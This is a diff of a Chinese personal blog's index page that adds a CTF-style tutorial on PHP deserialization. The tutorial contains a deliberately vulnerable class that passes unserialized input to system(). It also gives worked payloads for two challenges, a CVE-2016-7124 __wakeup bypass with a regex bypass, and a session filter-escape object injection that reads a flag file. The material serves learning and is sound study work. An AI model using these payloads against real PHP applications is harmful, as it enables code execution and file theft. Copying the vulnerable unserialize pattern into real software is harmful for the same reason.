@@ -187,6 +187,336 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://xrzmblog.cn/posts/2211845110.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="仙人掌门">
+      <meta itemprop="description" content="记录学习的过程">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="掌门のblog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/2211845110.html" class="post-title-link" itemprop="url">序列化和反序列化</a>
+        </h2>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-04-24 17:59:32" itemprop="dateCreated datePublished" datetime="2024-04-24T17:59:32+08:00">2024-04-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-05-05 22:00:24" itemprop="dateModified" datetime="2024-05-05T22:00:24+08:00">2024-05-05</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">web攻防</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>serialize()     &#x2F;&#x2F;序列化:将变量转换为可保存或传输的字符串的过程；<br>unserialize()   &#x2F;&#x2F;反序列化:在适当的时候把这个字符串再转化成原来的变量使用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span> = <span class="string">&#x27;ctf&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isAdmin</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">```  </span><br><span class="line">返回结果：`O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot; * name&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;ctf&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot; User isAdmin&quot;</span>;b:<span class="number">1</span>;&#125;`  </span><br><span class="line">这里O代表对象，这里是序列化的一个对象，要序列化数组的就用A</span><br><span class="line"><span class="number">4</span>表示的是类的长度</span><br><span class="line">User表示是类名</span><br><span class="line"><span class="number">2</span>表示类里面有<span class="number">2</span>个属性，也称为变量</span><br><span class="line">s表示字符串的长度这里的 * name表示属性(注意*号两边有空格)</span><br><span class="line">比如s:<span class="number">7</span>:<span class="string">&quot; * name&quot;</span> 这里表示的是  * name属性名（变量名）为<span class="number">7</span>个字符串长度： 字符串 属性长度 属性值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 访问控制修饰符</span></span><br><span class="line"><span class="keyword">public</span>（公有）：可以被任何类访问，没有限制。  </span><br><span class="line"><span class="keyword">protected</span>（受保护）：只能被其自身类、子类和父类访问。  </span><br><span class="line"><span class="keyword">private</span>（私有）：只能被其自身类访问，其他类无法直接访问。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**注意：**访问控制修饰符不同，序列化后属性的长度和属性值会有所不同：</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>：属性被序列化的时候属性值会变成---`属性名`  </span><br><span class="line"><span class="keyword">protected</span>：属性被序列化的时候属性值会变成---`\x00*\x00属性名`  </span><br><span class="line"><span class="keyword">private</span>：属性被序列化的时候属性值会变成---`\x00类名\x00属性名`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 魔术方法：  </span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__construct</span>()， <span class="title function_ invoke__">__destruct</span>()， <span class="title function_ invoke__">__call</span>()， <span class="title function_ invoke__">__callStatic</span>()， <span class="title function_ invoke__">__get</span>()， <span class="title function_ invoke__">__set</span>()， <span class="title function_ invoke__">__isset</span>()， <span class="title function_ invoke__">__unset</span>()，<span class="title function_ invoke__">__sleep</span>()， <span class="title function_ invoke__">__wakeup</span>()， <span class="title function_ invoke__">__toString</span>()， <span class="title function_ invoke__">__invoke</span>()， <span class="title function_ invoke__">__set_state</span>()， <span class="title function_ invoke__">__clone</span>() 和 <span class="title function_ invoke__">__debugInfo</span>() 等方法在 PHP 中被称为<span class="string">&quot;魔术方法&quot;</span>（Magic methods）。在命名自己的类方法时不能使用这些方法名，除非是想使用其魔术功能。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>…… &#x2F;&#x2F;构造class的代码省略<br>$u1 &#x3D; new User();     （1）<br>$s &#x3D; serialize($u1);     （2）<br>echo $s . “<br>”;      （3）</p>
+<p>$o &#x3D; unserialize($s);    （4）<br>echo $o;             （5）</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1</span>) 在代码执行第一步时会调用<span class="built_in">__construct</span>()方法，在程序结束后会自动执行<span class="built_in">__destruct</span>()方法  </span><br><span class="line"><span class="number">2</span>) 在执行<span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>时，会在<span class="built_in">__construct</span>()和<span class="built_in">__destruct</span>()之间进行输出  </span><br><span class="line"><span class="number">3</span>) 在执行<span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>，<span class="number">4</span>时，在执行第四步之前，会先执行<span class="built_in">__wakeup</span>()方法，输出如下：  </span><br><span class="line">!<span class="selector-attr">[]</span>(serialize-unserialize/<span class="number">4</span>.png)  </span><br><span class="line">由于有两个对象，所以进行两次destruct进行销毁  </span><br><span class="line"><span class="number">4</span>) 在执行<span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>，<span class="number">4</span>，<span class="number">5</span>时，会在<span class="built_in">__wakeup</span>()方法后执行<span class="built_in">__toString</span>()方法，最后进行销毁。  </span><br><span class="line">所以我们可以得知关键魔术方法的执行顺序：<span class="built_in">__construct</span>() -&gt;<span class="built_in">__sleep</span>()*（在对象被序列化时调用）* -&gt; <span class="built_in">__wakeup</span>() -&gt; <span class="built_in">__toString</span>() -&gt; <span class="built_in">__destruct</span>()</span><br><span class="line">&lt;br&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## php序列化--任意命令执行</span><br><span class="line"></span><br><span class="line">漏洞代码示例：</span><br></pre></td></tr></table></figure>
+<?php
+class Test{
+    public $cmd = "whoami";
+    function __wakeup()
+    {
+        system($this->cmd);
+    }
+}
+$Obj = unserialize($_GET['cmd']);   //当unserialize运行，wakeup方法会自动执行，从而实现命令执行
+?>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">序列化字符串生成(`O:<span class="number">5</span>:<span class="string">&quot;Test1&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;cmd&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;whoami&quot;</span>;&#125;`):</span><br></pre></td></tr></table></figure>
+<?php  
+class Test1{
+    public $cmd = "whoami";
+}
+$test = new Test1();
+echo serialize($test);
+?>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">然后更改`<span class="number">6</span>:<span class="string">&quot;whoami&quot;</span>`这两个参数即可执行任意命令。</span><br><span class="line">&lt;br&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## ctf例题：web_php_unserialize</span><br><span class="line"></span><br><span class="line">![](serialize-unserialize/<span class="number">1.</span>png)</span><br><span class="line"></span><br><span class="line">这里对代码进行审计：</span><br></pre></td></tr></table></figure>
+<?php 
+class Demo { 
+    private $file = 'index.php';  //这里首先定义file的值为index.php
+    public function __construct($file) {   
+        $this->file = $file;  //构造函数 __construct 接受一个参数 $file，并将私有属性 $file 设置为传入的值，所以我们在设置payload的时候应把fl4g.php传入$file
+    }
+    function __destruct() { 
+        echo @highlight_file($this->file, true);   //在销毁对象时会自动调用，输出$file的值
+    }
+    function __wakeup() { 
+        if ($this->file != 'index.php') {  //如果file不为index.php,那么把file的值该回index.php,所以这里我们需要做的就是令wakeup方法不执行
+            //the secret is in the fl4g.php（自带的注释，提醒我们传入fl4g.php）
+            $this->file = 'index.php'; 
+        } 
+    } 
+}
+if (isset($_GET['var'])) {   
+    $var = base64_decode($_GET['var']);  //对$var进行base64解密，所以我们在设置payload时应该先进行base64加密再进行传参
+    if (preg_match('/[oc]:\d+:/i', $var)) {   //php正则匹配，防止对象注入，如果检测到像 {s:4:'flag'}这样的参数，那么就会终止程序
+        die('stop hacking!'); 
+    } else {
+        @unserialize($var);   //匹配失败则输出反序列化后的$var
+    } 
+} else { 
+    highlight_file("index.php");   //否则输出index.php
+} 
+?>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">所以构造payload,得到`O:<span class="number">4</span>:<span class="string">&quot;Demo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot; Demo file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;fl4g.php&quot;</span>;&#125;`,注意这里Demo file 中的Demo两边是有空格的:</span><br></pre></td></tr></table></figure>
+<?php
+file";s:8:"fl4g.php";}
+class Demo {
+    private $file = 'index.php';
+    public function __construct($file) {
+        $this->file = $file;
+    }
+    function __destruct(){
+        echo @highlight_file($this->file,true);
+    }
+    function __wakeup(){
+        if($this->file != 'index.php'){
+            $this->file = 'index.php';
+        }
+    }
+}
+$var = new Demo("fl4g.php");
+$o = serialize($var);
+echo $o;
+?>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">绕过正则匹配(数字前面加一个”+”号)：  </span><br><span class="line">`O:+<span class="number">4</span>:<span class="string">&quot;Demo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot; Demo file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;fl4g.php&quot;</span>;&#125;`</span><br><span class="line"></span><br><span class="line">而要令wakeup方法不执行，就需要绕过wakeup方法，这里用到的是php的一个漏洞（CVE-<span class="number">2016</span>-<span class="number">7124</span>），把”Demo”后面的”<span class="number">1</span>”参数改为<span class="number">2</span>或者其他更大的整数：  </span><br><span class="line">`O:+<span class="number">4</span>:<span class="string">&quot;Demo&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot; Demo file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;fl4g.php&quot;</span>;&#125;`</span><br><span class="line"></span><br><span class="line">这里还要先对payload进行加密，于是得到完整的构造payload代码：  </span><br></pre></td></tr></table></figure>
+<?php
+class Demo {
+    private $file = 'index.php';
+    public function __construct($file) {
+        $this->file = $file;
+    }
+    function __destruct(){
+        echo @highlight_file($this->file,true);
+    }
+    function __wakeup(){
+        if($this->file != 'index.php'){
+            $this->file = 'index.php';
+        }
+    }
+}
+$var = new Demo("fl4g.php");
+$o = serialize($var);
+echo $o;
+$str1 = str_replace(":4:",":+4:",$o);
+$str2 = str_replace(":1:",":2:",$str1);
+$str3 = base64_encode($str2);
+var_dump($str3);
+?>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">得到最终payload，`Tzor<span class="symbol">NDoiRGVtbyI6</span>Mjp<span class="number">7</span>czoxMDoiAERlbW<span class="number">8</span>AZmlsZSI<span class="number">7</span>cz<span class="meta">o4</span>OiJmbDR<span class="symbol">nLnBocCI7</span>fQ==`，输入到网页得到flag</span><br><span class="line">![]<span class="comment">(serialize-unserialize/2.png)</span></span><br><span class="line"></span><br><span class="line">![]<span class="comment">(serialize-unserialize/3.png)</span></span><br><span class="line">&lt;br&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">## ctf例题：easy_serialize_php1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![]<span class="comment">(serialize-unserialize/6.png)</span></span><br><span class="line"></span><br><span class="line">代码审计：  </span><br></pre></td></tr></table></figure>
+<?php
+
+$function = @$_GET['f'];
+
+function filter($img){
+    $filter_arr = array('php','flag','php5','php4','fl1g');
+    $filter = '/'.implode('|',$filter_arr).'/i';  
+    //implode函数将数组用"|"组合成字符串，在生成的字符串的前后各加一个 '/'，将其变成一个正则表达式，i意味着不区分大小写
+    return preg_replace($filter,'',$img);  
+    //preg_replace 函数会在 $img 中查找匹配 $filter 的内容，并将其替换为空字符串。
+}
+
+
+if($_SESSION){
+    unset($_SESSION);  
+    //$_SESSION 是一个用来存储会话数据的超全局数组，在 PHP 中经常用于跨页面传递数据。如果会话存在则清空会话数据
+}
+
+$_SESSION["user"] = 'guest'; 
+$_SESSION['function'] = $function; 
+
+extract($_POST); 
+//根据extract()我们可以进行变量覆盖，当我们POST传入SESSION[flag]=123时，$SESSION["user"]和$SESSION['function'] 全部会消失，只剩下SESSION[flag]=123。
+
+if(!$function){  //$function为空则页面回到初始
+    echo '<a href="index.php?f=highlight_file">source_code';
+}
+
+if(!$_GET['img_path']){   //这里可以更改$_GET['img_path']或使$_GET['img_path']为空来达到读取flag的目的，我们选择使$_GET['img_path']为空
+    $_SESSION['img'] = base64_encode('guest_img.png');   //如果$_GET['img_path']为空，则执行
+}else{
+    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));   
+}
+
+$serialize_info = filter(serialize($_SESSION));
+
+if($function == 'highlight_file'){
+    highlight_file('index.php');
+}else if($function == 'phpinfo'){
+    eval('phpinfo();'); //maybe you can find something in here!
+}else if($function == 'show_image'){   //只有当function的值为show_image时，才能对$serialize_info进行反序列化和其他后续的操作。
+    $userinfo = unserialize($serialize_info);
+    echo file_get_contents(base64_decode($userinfo['img']));
+} 
+?>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">将<span class="function"><span class="keyword">function</span>设置成<span class="title">phpinfo</span>，得到<span class="title">flag</span>信息：</span></span><br><span class="line"><span class="function">![]<span class="params">(serialize-unserialize/5.png)</span></span></span><br><span class="line"></span><br><span class="line">首先要知道我们需要序列化user，<span class="function"><span class="keyword">function</span>，<span class="title">img</span>。</span></span><br></pre></td></tr></table></figure>
+<p>$_SESSION[“user”] &#x3D; ‘guest’;<br>$_SESSION[‘function’] &#x3D; $function;<br>$_SESSION[‘img’]&#x3D;base64_encode(‘guest_img.png’);</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">构建代码输出序列化内容</span><br></pre></td></tr></table></figure>
+<?php
+$_SESSION["user"] = 'guest';
+$_SESSION['function'] = 'z';
+$_SESSION['img'] = 'ZDBnM19mMWFnLnBocA==';  //d0g3_f1ag.php base64编码
+var_dump(serialize($_SESSION));
+?>
+<p>&#x2F;&#x2F;得到string(90) “a:3:{s:4:”user”;s:5:”guest”;s:8:”function”;s:1:”z”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA&#x3D;&#x3D;”;}”</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">**注意：**序列化之后长度s获取的字符串的长度一定为s，否则会继续往后读，并且unserialize会把多余的字符串当垃圾处理，在</span><span class="template-variable">&#123;&#125;</span><span class="language-xml">内的就是正确的，</span><span class="template-variable">&#123;&#125;</span><span class="language-xml">后面的就都被丢弃。  </span></span><br><span class="line"><span class="language-xml">所以我们的目的是把`$_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);`这段代码的img属性放到</span><span class="template-variable">&#123;&#125;</span><span class="language-xml">外，然后在</span><span class="template-variable">&#123;&#125;</span><span class="language-xml">中注好新的img属性，于是他本来要求的img属性就被替换了。  </span></span><br></pre></td></tr></table></figure>
+<?php
+$_SESSION["user"] = 'flagflagflagflagflagphp';  //user里的内容会被过滤掉，然后会接着往后取23个字符
+$_SESSION['function'] = '";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"a";s:2:"bb";}';
+$_SESSION['img'] = 'ZDBnM19mMWFnLnBocA==';     //d0g3_f1ag.php base64编码
+var_dump(serialize($_SESSION));
+?>
+<pre><code>得到  `a:3:&#123;s:4:&quot;user&quot;;s:23:&quot;flagflagflagflagflagphp&quot;;s:8:&quot;function&quot;;s:57:&quot;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;1&quot;;s:1:&quot;2&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;`  
+&#125;  
+经过删除和过滤后，于是剩下(其中 *&quot;;s:8:&quot;function&quot;;s:57:&quot;* 是user的键值，而 *s:1:&quot;a&quot;;s:2:&quot;bb&quot;;* 是作为第3个序列化数组凑数的):  
+  `a:3:&#123;s:4:&quot;user&quot;;s:23:&quot;&quot;;s:8:&quot;function&quot;;s:57:&quot;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;a&quot;;s:2:&quot;bb&quot;;&#125;`
+
+构造payload：  
+`_SESSION[user]=flagflagflagflagflagphp&amp;_SESSION[function]=&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;a&quot;;s:2:&quot;bb&quot;;&#125;`  
+得到了flag的所在
+![](serialize-unserialize/7.png)
+
+获取`/d0g3_fllllllag`的base64加密值`L2QwZzNfZmxsbGxsbGFn`（刚好也是20位），填入payload，得到最终payload：  
+`_SESSION[user]=flagflagflagflagflagphp&amp;_SESSION[function]=&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;a&quot;;s:2:&quot;bb&quot;;&#125;`   
+取得flag
+![](serialize-unserialize/8.png)
+</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://xrzmblog.cn/posts/154257042.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="仙人掌门">
+      <meta itemprop="description" content="记录学习的过程">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="掌门のblog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/154257042.html" class="post-title-link" itemprop="url">文件上传漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-04-21 15:52:41" itemprop="dateCreated datePublished" datetime="2024-04-21T15:52:41+08:00">2024-04-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-04-29 00:07:07" itemprop="dateModified" datetime="2024-04-29T00:07:07+08:00">2024-04-29</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">web攻防</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/154257042.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://xrzmblog.cn/posts/1051313787.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -617,7 +947,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-02-24 16:44:53" itemprop="dateModified" datetime="2024-02-24T16:44:53+08:00">2024-02-24</time>
+                <time title="修改时间：2024-04-25 23:19:10" itemprop="dateModified" datetime="2024-04-25T23:19:10+08:00">2024-04-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -827,90 +1157,11 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://xrzmblog.cn/posts/47caaf1e.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="仙人掌门">
-      <meta itemprop="description" content="记录学习的过程">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="掌门のblog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/posts/47caaf1e.html" class="post-title-link" itemprop="url">markdown基本语法</a>
-        </h2>
-
-        <div class="post-meta">
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2024-02-05 17:41:12" itemprop="dateCreated datePublished" datetime="2024-02-05T17:41:12+08:00">2024-02-05</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-02-17 18:03:17" itemprop="dateModified" datetime="2024-02-17T18:03:17+08:00">2024-02-17</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/hexo/" itemprop="url" rel="index"><span itemprop="name">hexo</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="markdown基本语法说明"><a href="#markdown基本语法说明" class="headerlink" title="markdown基本语法说明"></a>markdown基本语法说明</h1>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/posts/47caaf1e.html#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
 
 
 
@@ -977,7 +1228,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-count">11</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -990,7 +1241,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
